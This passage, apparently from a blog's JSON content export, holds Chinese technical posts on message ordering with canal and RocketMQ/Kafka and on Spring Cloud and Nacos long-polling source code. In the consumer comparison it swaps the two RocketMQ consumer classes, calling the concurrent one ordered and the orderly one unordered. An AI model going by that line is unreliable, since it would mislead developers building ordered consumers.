href=\"https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&mid=2247491496&idx=1&sn=cb31f7510a7c2efb7daf6cad793860ad&scene=21#wechat_redirect\">https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&amp;mid=2247491496&amp;idx=1&amp;sn=cb31f7510a7c2efb7daf6cad793860ad&amp;scene=21#wechat_redirect</a>)</p>\n","cover":"/img/liushui.png","cover_type":"img","excerpt":"","more":"<p>如何实现消息有序？实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。</p>\n<p>在MQ模型中，顺序需由3个阶段去保障</p>\n<ol>\n<li><p>顺序发送： 发送时保持顺序一致</p>\n</li>\n<li><p>顺序存储： broker 存储时保持 顺序一致</p>\n</li>\n<li><p>顺序消费： 消费时 保持 顺序一致</p>\n</li>\n</ol>\n<p><img src=\"/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/1.png\"></p>\n<h2 id=\"2-消息有序的两大类型\"><a href=\"#2-消息有序的两大类型\" class=\"headerlink\" title=\"2 消息有序的两大类型\"></a>2 消息有序的两大类型</h2><p>有序消息，又叫顺序消息(FIFO消息)，指消息的消费顺序和产生顺序相同。</p>\n<p>如订单的生成、付款、发货，这串消息必须按序处理。</p>\n<p>顺序消息又可分为全局有序和局部有序：</p>\n<ul>\n<li><p><strong>全局有序</strong>：整个MQ系统的所有消息严格按照队列先入先出顺序进行消费</p>\n</li>\n<li><p><strong>局部有序</strong>：只保证一部分关键信息的消费顺序</p>\n</li>\n</ul>\n<h3 id=\"2-1-全局顺序\"><a href=\"#2-1-全局顺序\" class=\"headerlink\" title=\"2.1 全局顺序\"></a>2.1 全局顺序</h3><p>一个Topic内所有的消息都发布到同一Q，按FIFO顺序进行发布和消费：</p>\n<p><img src=\"/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/2.png\"></p>\n<p>落地到RocketMQ，如何保证全局有序？</p>\n<p>为了 保证Topic全局消息有序的方式，就是将Topic配置成只有一个唯一的MessageQueue队列， 默认是4个MessageQueue。</p>\n<p>RocketMQ中，可以在发送者发送消息时指定一个MessageSelector对象，让这个对象来决定消息发入哪一个MessageQueue。这样就可以保证一组有序的消息能够发到同一个MessageQueue里。</p>\n<h4 id=\"适用场景\"><a href=\"#适用场景\" class=\"headerlink\" title=\"适用场景\"></a>适用场景</h4><p>性能要求不高，所有消息严格按照FIFO进行消息发布和消费的场景。</p>\n<h3 id=\"2-2-分区顺序\"><a href=\"#2-2-分区顺序\" class=\"headerlink\" title=\"2.2 分区顺序\"></a>2.2 分区顺序</h3><p>对于指定的一个Topic，所有消息按<code>sharding key</code>进行区块(queue)分区，同一Queue内的消息严格按FIFO发布和消费。</p>\n<ul>\n<li>Sharding key是顺序消息中用来区分不同分区的关键字段，和普通消息的Key完全不同。</li>\n</ul>\n<p><img src=\"/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/3.png\"></p>\n<p>落地到RocketMQ。而MessageQueue是RocketMQ存储消息的最小单元，他们之间的消息都是互相隔离的，在这种情况下，是无法保证消息全局有序的，但是可以保证局部有序。</p>\n<p>默认的做法是，发送消息时，会通过MessageQueue轮询的方式保证消息尽量均匀分布到所有的MessageQueue上，而消费者也就同样需要从多个MessageQueue上消费消息。这就做不到局部有序。</p>\n<p>对于局部有序的要求，只需要将有序的一组消息都存入同一个MessageQueue里，这样MessageQueue的FIFO设计天生就可以保证这一组消息的有序。</p>\n<h4 id=\"适用场景-1\"><a href=\"#适用场景-1\" class=\"headerlink\" title=\"适用场景\"></a>适用场景</h4><p>性能要求高，根据消息中的sharding key去决定消息发送到哪个queue。</p>\n<p>其实大部分的MQ业务场景，我们只需要保证局部有序就可以了。</p>\n<p>例如</p>\n<ul>\n<li><p>我们用QQ聊天，只需要保证一个聊天窗口里的消息有序就可以了。</p>\n</li>\n<li><p>而对于电商订单场景，也只要保证一个订单的所有消息是有序的就可以了。</p>\n</li>\n</ul>\n<h3 id=\"2-3-对比\"><a href=\"#2-3-对比\" class=\"headerlink\" title=\"2.3 对比\"></a>2.3 对比</h3><p><strong>发送方式对比</strong></p>\n<p><img src=\"/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/4.png\"></p>\n<p><strong>存储方式对比</strong></p>\n<ul>\n<li>无</li>\n</ul>\n<p><strong>消费方式对比</strong></p>\n<ul>\n<li><p>有序消费的消费者类型：ConsumeMessageConcurrentlyService 并发消费服务</p>\n</li>\n<li><p>无序消费的消费者类型：ConsumeMessageOrderlyService</p>\n</li>\n</ul>\n<h2 id=\"3-应用开发维度的实现消息有序需要做的工作：\"><a href=\"#3-应用开发维度的实现消息有序需要做的工作：\" class=\"headerlink\" title=\"3 应用开发维度的实现消息有序需要做的工作：\"></a>3 应用开发维度的实现消息有序需要做的工作：</h2><p>实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。 顺序存储环节，RocketMQ 里的分区队列 MessageQueue 本身是能保证 FIFO 的。</p>\n<p>所以，在应用开发过程中，不能顺序消费消息主要有两个原因：</p>\n<ul>\n<li><p><strong>顺序发送环节，消息发生没有序</strong>：Producer 发送消息到 MessageQueue 时是轮询发送的，消息被发送到不同的分区队列，就不能保证 FIFO 了。</p>\n</li>\n<li><p><strong>顺序消费环节，消息消费无序</strong>：Consumer 默认是多线程并发消费同一个 MessageQueue 的，即使消息是顺序到达的，也不能保证消息顺序消费。</p>\n</li>\n</ul>\n<p>我们知道了实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。</p>\n<p>顺序存储 由 Rocketmq 完成，所以，在应用开发层, 消息的顺序需要由两个阶段保证：</p>\n<ul>\n<li><p>消息发送有序</p>\n</li>\n<li><p>消息消费有序</p>\n</li>\n</ul>\n<p><img src=\"/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/5.png\"></p>\n<h2 id=\"4：canal-MQ，如何实现有序？\"><a href=\"#4：canal-MQ，如何实现有序？\" class=\"headerlink\" title=\"4：canal+MQ，如何实现有序？\"></a>4：canal+MQ，如何实现有序？</h2><p>Canal 是阿里巴巴开源的一个增量订阅和消费的中间件，用于基于 MySQL 的数据库增量日志解析（Binlog）。通过 Canal，可以实现对数据库的实时监控和数据同步。</p>\n<p>我们在通过Canal把MySQL的Binlog数据发送到MQ(kafak&#x2F;rocketmq)时，需要关注好几个环节：</p>\n<ul>\n<li><p>Cannal 的有序监听。 Binlog本身是有序的，写入到mq之后如何保障顺序</p>\n</li>\n<li><p>Cannal 的有序发送。</p>\n</li>\n<li><p>顺序存储： broker 存储时保持 顺序一致</p>\n</li>\n<li><p>顺序消费： 消费时 保持 顺序一致</p>\n</li>\n</ul>\n<h3 id=\"4-1-Cannal-的有序发送\"><a href=\"#4-1-Cannal-的有序发送\" class=\"headerlink\" title=\"4.1 Cannal 的有序发送\"></a>4.1 Cannal 的有序发送</h3><p>canal目前支持kafka和rocketmq，在使用 Canal 进行数据同步时，保证数据的有序性是一个重要的问题，尤其是在分布式环境中。在 Kafka 或 RocketMQ 等消息队列中，消息的顺序性和分区策略至关重要。</p>\n<p>canal 本质上都是基于本地文件的方式来支持分区级别的顺序消息，也就是binlog写入mq是可以有一定的顺序性保障，这个保障级别取决于用户的两个配置项：</p>\n<ul>\n<li><p><code>canal.mq.partitionsNum</code></p>\n</li>\n<li><p><code>canal.mq.partitionHash</code></p>\n</li>\n</ul>\n<p>两个配置项 用于控制消息的分区和顺序。两个配置项介绍如下：</p>\n<ol>\n<li><strong>canal.mq.partitionsNum</strong>：</li>\n</ol>\n<ul>\n<li><p><strong>描述</strong>：设置消息队列的分区数量。</p>\n</li>\n<li><p><strong>作用</strong>：决定了消息在消息队列中被分区的数量。不同的分区可以并行处理，但需要注意同一个分区内的消息是有序的。</p>\n</li>\n</ul>\n<ol start=\"3\">\n<li><strong>canal.mq.partitionHash</strong>：</li>\n</ol>\n<ul>\n<li><p><strong>描述</strong>：设置消息分区的哈希规则。</p>\n</li>\n<li><p><strong>作用</strong>：用于指定分区的哈希策略，可以根据特定的字段进行分区。例如，可以根据表名、主键等字段进行分区，以保证某些关键数据的有序性。</p>\n</li>\n</ul>\n<h3 id=\"4-2-Cannal-的有序发送示例\"><a href=\"#4-2-Cannal-的有序发送示例\" class=\"headerlink\" title=\"4.2 Cannal 的有序发送示例\"></a>4.2 Cannal 的有序发送示例</h3><p>假设我们希望将数据同步到 Kafka，并且需要保证某张表的数据是有序的，可以使用以下配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">canal.mq.partitionsNum=10  </span><br><span class=\"line\">canal.mq.partitionHash=my\\_database.my\\_table:id  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>配置解释</p>\n<ol>\n<li><strong>canal.mq.partitionsNum&#x3D;10</strong>：</li>\n</ol>\n<ul>\n<li>表示消息会被分成 10 个分区。每个分区可以并行处理，从而提高处理效率。</li>\n</ul>\n<ol start=\"3\">\n<li><strong>canal.mq.partitionHash&#x3D;my_database.my_table</strong></li>\n</ol>\n<ul>\n<li><p>针对 <code>my_database.my_table</code> 表的数据，根据 <code>id</code> 字段进行哈希分区。</p>\n</li>\n<li><p>这样可以确保同一个 <code>id</code> 的所有变更都进入同一个分区，从而保证该 <code>id</code> 的变更顺序不变。</p>\n</li>\n</ul>\n<p>通过配置 <code>canal.mq.partitionHash</code>，分区内的消息是有序的，因此只要保证同一实体（如同一行数据）的变更进入同一个分区，就能保证其有序性。</p>\n<h3 id=\"4-3-Cannal-的使用场景\"><a href=\"#4-3-Cannal-的使用场景\" class=\"headerlink\" title=\"4.3 Cannal 的使用场景\"></a>4.3 Cannal 的使用场景</h3><ul>\n<li><p><strong>实时数据同步</strong>：将数据库的变更实时同步到其他系统，如搜索引擎、缓存等。</p>\n</li>\n<li><p><strong>数据备份</strong>：实现数据库的实时备份，确保数据的一致性和完整性。</p>\n</li>\n<li><p><strong>事件驱动架构</strong>：在事件驱动架构中，利用 Canal 将数据库变更作为事件发布到消息队列，供其他系统消费。</p>\n</li>\n</ul>\n<p>通过合理配置 <code>canal.mq.partitionsNum</code> 和 <code>canal.mq.partitionHash</code>，可以在数据同步中既保证有序性，又提高处理效率。<br>伙20天时间提75W年薪offer，逆涨50%，秘诀在这](<a href=\"https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&mid=2247491496&idx=1&sn=cb31f7510a7c2efb7daf6cad793860ad&scene=21#wechat_redirect\">https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&amp;mid=2247491496&amp;idx=1&amp;sn=cb31f7510a7c2efb7daf6cad793860ad&amp;scene=21#wechat_redirect</a>)</p>\n"},{"title":"Springcloud最热点面试题","date":"2024-05-26T14:57:29.000Z","_content":"\n\n\nSpring Cloud是一系列框架的有序集合。它利用Spring Boot的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、智能路由、消息总线、负载均衡、断路器、数据监控等，都可以用Spring Boot的开发风格做到一键启动和部署。\n\nSpring Cloud并没有重复制造轮子，它只是将各家公司开发的比较成熟、经得起实际考验的服务框架组合起来，通过Spring Boot风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。\n## 服务注册与发现\n### eureka\n服务治理组件，包括服务端的注册中心和客户端的服务发现机制；\n### consul\n基于Hashicorp Consul的服务治理组件。\n## 服务负载与均衡\n### ribbon\n负载均衡的服务调用组件，具有多种负载均衡调用策略；\n### loadbalancer\n## 服务负载与调用\n### feign\n基于Ribbon和Hystrix的声明式服务调用组件；\n### openFeign\n基于Ribbon和Hystrix的声明式服务调用组件，可以动态创建基于Spring MVC注解的接口实现用于服务调用，在Spring Cloud 2.0中已经取代Feign成为了一等公民。\n## 服务熔断与降级\n### hystrix\n服务容错组件，实现了断路器模式，为依赖服务的出错和延迟提供了容错能力；\n### resilience4j\n## 服务网关\n### zuul\nAPI网关组件，对请求提供路由及过滤功能。\n### zuul2\n### getway\nAPI网关组件，对请求提供路由及过滤功能。\n## 服务分布式配置\n### springcloud config\n集中配置管理工具，分布式系统中统一的外部配置管理，默认使用Git来存储配置，可以支持客户端配置的刷新及加密、解密操作。\n### Nacos\n## 总线\n### Spring Cloud Bus\n用于传播集群状态变化的消息总线，使用轻量级消息代理链接分布式系统中的节点，可以用来动态刷新集群中的服务配置。\n# springcloudAlibaba\n## Nacos\nNacos 是一个开源的分布式系统服务发现、配置管理和服务管理平台。它主要包含以下功能：\n\n服务发现与注册：Nacos 可以管理服务的注册和发现，支持 DNS 和 HTTP/RESTful 方式。\n配置管理：Nacos 可以动态管理配置，支持多种数据类型和版本控制。\n服务管理：Nacos 可以对服务进行健康检查、流量管理、负载均衡等。\n### 服务发现与注册\nNacos 实现服务发现和注册的核心代码位于 nacos/naming 目录下，包括以下文件：\n\n- naming-common/src/main/java/com/alibaba/nacos/api/naming: 定义了服务发现和注册的 API 接口和数据模型。\n- naming-core/src/main/java/com/alibaba/nacos/naming: 实现了服务发现和注册的核心逻辑。\n- naming-impl/src/main/java/com/alibaba/nacos/naming: 实现了服务发现和注册的具体实现。\n\n下面简单介绍一下 Nacos 的服务发现和注册的实现流程。\n\n#### 服务注册流程\n服务提供者向 Nacos 注册服务时，会调用 NamingService.registerInstance() 方法，该方法会做以下几件事情：\n\n1. 将服务实例的元数据封装为 Instance 对象，包括服务名、IP、端口号、健康状态、元数据等。\n2. 将 Instance 对象转换为 InstanceEntity 对象，包含了实例 ID 和实例元数据的 JSON 字符串。\n3. 将 InstanceEntity 对象存储到 Nacos 中，可以存储到内存中或者持久化到磁盘中。\n\n#### 服务发现流程\n服务消费者向 Nacos 发现服务时，会调用 NamingService.getAllInstances() 或 NamingService.selectInstances() 方法，该方法会做以下几件事情：\n\n1. 从 Nacos 中获取服务实例的元数据，包括服务名、IP、端口号、健康状态、元数据等。\n2. 将元数据封装为 Instance 对象，存储到本地缓存中。\n3. 根据负载均衡算法选择一个服务实例处理请求，可以选择轮询、随机、权重等算法。\n\n服务发现和注册的核心逻辑在 naming-core 目录下的 com.alibaba.nacos.naming 包中实现，主要包括以下类：\n\n- com.alibaba.nacos.naming.core.InstancesManager: 维护服务实例的元数据和状态信息。\n- com.alibaba.nacos.naming.core.Cluster: 维护一个服务的所有实例信息和负载均衡策略。\n- com.alibaba.nacos.naming.core.InstanceOperator: 实现了服务实例的注册、注销和更新操作。\n- com.alibaba.nacos.naming.core.DomainsManager: 维护多个服务的信息，包括服务名、集群名、命名空间等。\n\n服务发现和注册的具体实现在 naming-impl 目录下的 com.alibaba.nacos.naming 包中，主要包括以下类：\n\n- com.alibaba.nacos.naming.push.PushService: 实现了服务实例的推送功能。\n- com.alibaba.nacos.naming.healthcheck.HealthCheckProcessor: 实现了服务实例的健康检查功能。\n- com.alibaba.nacos.naming.misc.GlobalConfig: 存储了一些全局配置，例如默认权重值、心跳间隔\n\n### 配置动态刷新\n\n从远端服务器获取变更数据的主要模式有两种：推（push）和拉（pull）。Push 模式简单来说就是服务端主动将数据变更信息推送给客户端，这种模式优点是时效性好，服务端数据发生变更可以立马通知到客户端，但这种模式需要服务端维持与客户端的心跳连接，会增加服务端实现的复杂度，服务端也需要占用更多的资源来维持与客户端的连接。\n\n而 Pull 模式则是客户端主动去服务器请求数据，例如，每间隔10ms就向服务端发起请求获取数据。显而易见pull模式存在时效性问题。请求的间隔也不太好设置，间隔太短，对服务器请求压力过大。间隔时间过长，那么必然会造成时效性很差。而且如果配置长时间不更新，并且存在大量的客户端就会产生大量无效的pull请求。\n\nNacos 没有采用上述的两种模式，而是采用了长轮询方式结合了推和拉的优点：\n\n![动态刷新图](./2024/05/26/Springcloud最热点面试题/1.png)\n\n长轮询也是轮询，因此 Nacos 客户端会默认每10ms向服务端发起请求，当客户端请求服务端时会在请求头上携带长轮询的超时时间，默认是30s。而服务端接收到该请求时会hang住请求，为了防止客户端超时会在请求头携带的超时时间上减去500ms，因此默认会hang住请求29.5s。在这期间如果服务端发生了配置变更会产生相应的事件，监听到该事件后，会响应对应的客户端。这样一来客户端不会频繁发起轮询请求，而服务端也不需要维持与客户端的心跳，兼备了时效性和复杂度。\n\n![长轮询图](./2024/05/26/Springcloud最热点面试题/2.png)\n\n\n> 1.4版本nacos使用Http短连接+长轮询的方式，客户端发起http请求，服务端hold住请求，当配置变更时响应客户端，超时时间30s。\n> 2.0版本nacos用gRPC长连接代替了http短连接长轮询。配置同步采用推拉结合的方式。\n\n#### Nacos Config 长轮询源码剖析\n首先，打开 com.alibaba.cloud.nacos.NacosConfigBootstrapConfiguration 这个类，从类名也可以看出该类是Nacos Config的启动配置类，是Nacos Config自动装配的入口。在该类中的 nacosConfigManager 方法实例化了一个 NacosConfigManager 对象，并注册到容器中：\n\n```java\n@Bean\n@ConditionalOnMissingBean\npublic NacosConfigManager nacosConfigManager(\n\t\tNacosConfigProperties nacosConfigProperties) {\n\treturn new NacosConfigManager(nacosConfigProperties);\n}\n```\n在 NacosConfigManager 的构造器中调用了 createConfigService 方法，这是一个静态方法用来创建 ConfigService 对象的单例。\n```java\n/**\n * Compatible with old design,It will be perfected in the future.\n */\nstatic ConfigService createConfigService(\n\t\tNacosConfigProperties nacosConfigProperties) {\n    // 双重检查锁模式的单例\n\tif (Objects.isNull(service)) {\n\t\tsynchronized (NacosConfigManager.class) {\n\t\t\ttry {\n\t\t\t\tif (Objects.isNull(service)) {\n\t\t\t\t\tservice = NacosFactory.createConfigService(\n\t\t\t\t\t\t\tnacosConfigProperties.assembleConfigServiceProperties());\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch (NacosException e) {\n\t\t\t\tlog.error(e.getMessage());\n\t\t\t\tthrow new NacosConnectionFailureException(\n\t\t\t\t\t\tnacosConfigProperties.getServerAddr(), e.getMessage(), e);\n\t\t\t}\n\t\t}\n\t}\n\treturn service;\n}\n```\nConfigService 的具体实现是 NacosConfigService，在该类的构造器中主要初始化了 HttpAgent 和 ClientWorker 对象。ClientWorker 的构造器中则初始化了几个线程池：\n\n```java\npublic ClientWorker(final HttpAgent agent, final ConfigFilterChainManager configFilterChainManager,\n        final Properties properties) {\n    this.agent = agent;\n    this.configFilterChainManager = configFilterChainManager;\n    \n    // Initialize the timeout parameter\n    init(properties);\n    \n    // 创建具有定时执行功能的单线程池，用于定时执行 checkConfigInfo 方法\n    this.executor = Executors.newScheduledThreadPool(1, new ThreadFactory() {\n        @Override\n        public Thread newThread(Runnable r) {\n            Thread t = new Thread(r);\n            t.setName(\"com.alibaba.nacos.client.Worker.\" + agent.getName());\n            t.setDaemon(true);\n            return t;\n        }\n    });\n    \n    // 创建具有定时执行功能的且线程数与cpu核数相对应的线程池，用于根据需要动态刷新的配置文件执行 LongPollingRunnable，因此长轮询任务是可以有多个并行的\n    this.executorService = Executors\n            .newScheduledThreadPool(Runtime.getRuntime().availableProcessors(), new ThreadFactory() {\n                @Override\n                public Thread newThread(Runnable r) {\n                    Thread t = new Thread(r);\n                    t.setName(\"com.alibaba.nacos.client.Worker.longPolling.\" + agent.getName());\n                    t.setDaemon(true);\n                    return t;\n                }\n            });\n            \n    // 每10ms执行一次 checkConfigInfo 方法\n    this.executor.scheduleWithFixedDelay(new Runnable() {\n        @Override\n        public void run() {\n            try {\n                checkConfigInfo();\n            } catch (Throwable e) {\n                LOGGER.error(\"[\" + agent.getName() + \"] [sub-check] rotate check error\", e);\n            }\n        }\n    }, 1L, 10L, TimeUnit.MILLISECONDS);\n}\n\nprivate void init(Properties properties) {\n    // 长轮询的超时时间，默认为30秒，此参数会被放到请求头中带到服务端，服务端会根据该参数去做长轮询的hold\n    timeout = Math.max(ConvertUtils.toInt(properties.getProperty(PropertyKeyConst.CONFIG_LONG_POLL_TIMEOUT),\n            Constants.CONFIG_LONG_POLL_TIMEOUT), Constants.MIN_CONFIG_LONG_POLL_TIMEOUT);\n    \n    taskPenaltyTime = ConvertUtils\n            .toInt(properties.getProperty(PropertyKeyConst.CONFIG_RETRY_TIME), Constants.CONFIG_RETRY_TIME);\n    \n    this.enableRemoteSyncConfig = Boolean\n            .parseBoolean(properties.getProperty(PropertyKeyConst.ENABLE_REMOTE_SYNC_CONFIG));\n}\n\n/**\n * Check config info.\n */\npublic void checkConfigInfo() {\n    // Dispatch taskes.\n    // 获取需要监听的文件数量\n    int listenerSize = cacheMap.size();\n    // Round up the longingTaskCount.\n    // 默认一个 LongPollingRunnable 可以处理监听3k个配置文件的变化，超过3k个才会创建新的 LongPollingRunnable\n    int longingTaskCount = (int) Math.ceil(listenerSize / ParamUtil.getPerTaskConfigSize());\n    if (longingTaskCount > currentLongingTaskCount) {\n        for (int i = (int) currentLongingTaskCount; i < longingTaskCount; i++) {\n            // The task list is no order.So it maybe has issues when changing.\n            executorService.execute(new LongPollingRunnable(i));\n        }\n        currentLongingTaskCount = longingTaskCount;\n    }\n}\n```\nLongPollingRunnable 类主要用于检查本地配置，以及长轮询地去服务端获取变更配置的 dataid 和 group，其代码位于 com.alibaba.nacos.client.config.impl.ClientWorker 类，代码如下：\n```java\nclass LongPollingRunnable implements Runnable {\n    \n    private final int taskId;\n    \n    public LongPollingRunnable(int taskId) {\n        this.taskId = taskId;\n    }\n    \n    @Override\n    public void run() {\n        \n        List<CacheData> cacheDatas = new ArrayList<CacheData>();\n        List<String> inInitializingCacheList = new ArrayList<String>();\n        try {\n            // check failover config\n            // 遍历本地缓存的配置\n            for (CacheData cacheData : cacheMap.values()) {\n                if (cacheData.getTaskId() == taskId) {\n                    cacheDatas.add(cacheData);\n                    try {\n                        // 检查本地配置\n                        checkLocalConfig(cacheData);\n                        if (cacheData.isUseLocalConfigInfo()) {\n                            cacheData.checkListenerMd5();\n                        }\n                    } catch (Exception e) {\n                        LOGGER.error(\"get local config info error\", e);\n                    }\n                }\n            }\n            \n            // check server config\n            // 通过长轮询检查服务端配置\n            List<String> changedGroupKeys = checkUpdateDataIds(cacheDatas, inInitializingCacheList);\n            if (!CollectionUtils.isEmpty(changedGroupKeys)) {\n                LOGGER.info(\"get changedGroupKeys:\" + changedGroupKeys);\n            }\n            \n            for (String groupKey : changedGroupKeys) {\n                String[] key = GroupKey.parseKey(groupKey);\n                String dataId = key[0];\n                String group = key[1];\n                String tenant = null;\n                if (key.length == 3) {\n                    tenant = key[2];\n                }\n                try {\n                    String[] ct = getServerConfig(dataId, group, tenant, 3000L);\n                    CacheData cache = cacheMap.get(GroupKey.getKeyTenant(dataId, group, tenant));\n                    cache.setContent(ct[0]);\n                    if (null != ct[1]) {\n                        cache.setType(ct[1]);\n                    }\n                    LOGGER.info(\"[{}] [data-received] dataId={}, group={}, tenant={}, md5={}, content={}, type={}\",\n                            agent.getName(), dataId, group, tenant, cache.getMd5(),\n                            ContentUtils.truncateContent(ct[0]), ct[1]);\n                } catch (NacosException ioe) {\n                    String message = String\n                            .format(\"[%s] [get-update] get changed config exception. dataId=%s, group=%s, tenant=%s\",\n                                    agent.getName(), dataId, group, tenant);\n                    LOGGER.error(message, ioe);\n                }\n            }\n            for (CacheData cacheData : cacheDatas) {\n                if (!cacheData.isInitializing() || inInitializingCacheList\n                        .contains(GroupKey.getKeyTenant(cacheData.dataId, cacheData.group, cacheData.tenant))) {\n                    cacheData.checkListenerMd5();\n                    cacheData.setInitializing(false);\n                }\n            }\n            inInitializingCacheList.clear();\n            \n            executorService.execute(this);\n            \n        } catch (Throwable e) {\n            \n            // If the rotation training task is abnormal, the next execution time of the task will be punished\n            LOGGER.error(\"longPolling error : \", e);\n            executorService.schedule(this, taskPenaltyTime, TimeUnit.MILLISECONDS);\n        }\n    }\n}\n```\n上面有个 checkUpdateDataIds 方法，用于获取发生变更了的配置文件的dataId列表，它同样位于 ClientWorker 内。如下：\n```java\n/**\n * Fetch the dataId list from server.\n *\n * @param cacheDatas              CacheDatas for config infomations.\n * @param inInitializingCacheList initial cache lists.\n * @return String include dataId and group (ps: it maybe null).\n * @throws Exception Exception.\n */\nList<String> checkUpdateDataIds(List<CacheData> cacheDatas, List<String> inInitializingCacheList) throws Exception {\n    // 拼接出配置文件的唯一标识\n    StringBuilder sb = new StringBuilder();\n    for (CacheData cacheData : cacheDatas) {\n        if (!cacheData.isUseLocalConfigInfo()) {\n            sb.append(cacheData.dataId).append(WORD_SEPARATOR);\n            sb.append(cacheData.group).append(WORD_SEPARATOR);\n            if (StringUtils.isBlank(cacheData.tenant)) {\n                sb.append(cacheData.getMd5()).append(LINE_SEPARATOR);\n            } else {\n                sb.append(cacheData.getMd5()).append(WORD_SEPARATOR);\n                sb.append(cacheData.getTenant()).append(LINE_SEPARATOR);\n            }\n            if (cacheData.isInitializing()) {\n                // It updates when cacheData occours in cacheMap by first time.\n                inInitializingCacheList\n                        .add(GroupKey.getKeyTenant(cacheData.dataId, cacheData.group, cacheData.tenant));\n            }\n        }\n    }\n    boolean isInitializingCacheList = !inInitializingCacheList.isEmpty();\n    return checkUpdateConfigStr(sb.toString(), isInitializingCacheList);\n}\n\n/**\n * Fetch the updated dataId list from server.\n *\n * @param probeUpdateString       updated attribute string value.\n * @param isInitializingCacheList initial cache lists.\n * @return The updated dataId list(ps: it maybe null).\n * @throws IOException Exception.\n */\nList<String> checkUpdateConfigStr(String probeUpdateString, boolean isInitializingCacheList) throws Exception {\n    \n    Map<String, String> params = new HashMap<String, String>(2);\n    params.put(Constants.PROBE_MODIFY_REQUEST, probeUpdateString);\n    Map<String, String> headers = new HashMap<String, String>(2);\n    // 长轮询的超时时间\n    headers.put(\"Long-Pulling-Timeout\", \"\" + timeout);\n    \n    // told server do not hang me up if new initializing cacheData added in\n    if (isInitializingCacheList) {\n        headers.put(\"Long-Pulling-Timeout-No-Hangup\", \"true\");\n    }\n    \n    if (StringUtils.isBlank(probeUpdateString)) {\n        return Collections.emptyList();\n    }\n    \n    try {\n        // In order to prevent the server from handling the delay of the client's long task,\n        // increase the client's read timeout to avoid this problem.\n        \n        long readTimeoutMs = timeout + (long) Math.round(timeout >> 1);\n        // 向服务端发起一个http请求，该请求在服务端配置没有变更的情况下默认会hang住30s\n        HttpRestResult<String> result = agent\n                .httpPost(Constants.CONFIG_CONTROLLER_PATH + \"/listener\", headers, params, agent.getEncode(),\n                        readTimeoutMs);\n        \n        if (result.ok()) {\n            setHealthServer(true);\n            // 响应状态是成功则解析响应体得到 dataId、group、tenant 等信息并返回\n            return parseUpdateDataIdResponse(result.getData());\n        } else {\n            setHealthServer(false);\n            LOGGER.error(\"[{}] [check-update] get changed dataId error, code: {}\", agent.getName(),\n                    result.getCode());\n        }\n    } catch (Exception e) {\n        setHealthServer(false);\n        LOGGER.error(\"[\" + agent.getName() + \"] [check-update] get changed dataId exception\", e);\n        throw e;\n    }\n    return Collections.emptyList();\n}\n```\n客户端对 listener 接口的请求会进入到服务端的 com.alibaba.nacos.config.server.controller.ConfigController#listener 方法进行处理，该方法主要是调用了 com.alibaba.nacos.config.server.controller.ConfigServletInner#doPollingConfig 方法。代码如下：\n```java\n/**\n * 轮询接口\n */\npublic String doPollingConfig(HttpServletRequest request, HttpServletResponse response,\n                              Map<String, String> clientMd5Map, int probeRequestSize)\n    throws IOException, ServletException {\n\n    // 如果支持长轮询则进入长轮询的流程\n    if (LongPollingService.isSupportLongPolling(request)) {\n        longPollingService.addLongPollingClient(request, response, clientMd5Map, probeRequestSize);\n        return HttpServletResponse.SC_OK + \"\";\n    }\n\n    // else 兼容短轮询逻辑\n    List<String> changedGroups = MD5Util.compareMd5(request, response, clientMd5Map);\n\n    // 兼容短轮询result\n    String oldResult = MD5Util.compareMd5OldResult(changedGroups);\n    String newResult = MD5Util.compareMd5ResultString(changedGroups);\n\n    String version = request.getHeader(Constants.CLIENT_VERSION_HEADER);\n    if (version == null) {\n        version = \"2.0.0\";\n    }\n    int versionNum = Protocol.getVersionNumber(version);\n\n    /**\n     * 2.0.4版本以前, 返回值放入header中\n     */\n    if (versionNum < START_LONGPOLLING_VERSION_NUM) {\n        response.addHeader(Constants.PROBE_MODIFY_RESPONSE, oldResult);\n        response.addHeader(Constants.PROBE_MODIFY_RESPONSE_NEW, newResult);\n    } else {\n        request.setAttribute(\"content\", newResult);\n    }\n\n    // 禁用缓存\n    response.setHeader(\"Pragma\", \"no-cache\");\n    response.setDateHeader(\"Expires\", 0);\n    response.setHeader(\"Cache-Control\", \"no-cache,no-store\");\n    response.setStatus(HttpServletResponse.SC_OK);\n    return HttpServletResponse.SC_OK + \"\";\n}\n```\n我们主要关注上面的 com.alibaba.nacos.config.server.service.LongPollingService#addLongPollingClient 长轮询流程的方法。代码如下：\n```java\npublic void addLongPollingClient(HttpServletRequest req, HttpServletResponse rsp, Map<String, String> clientMd5Map,\n                                 int probeRequestSize) {\n\n    String str = req.getHeader(LongPollingService.LONG_POLLING_HEADER);\n    String noHangUpFlag = req.getHeader(LongPollingService.LONG_POLLING_NO_HANG_UP_HEADER);\n    String appName = req.getHeader(RequestUtil.CLIENT_APPNAME_HEADER);\n    String tag = 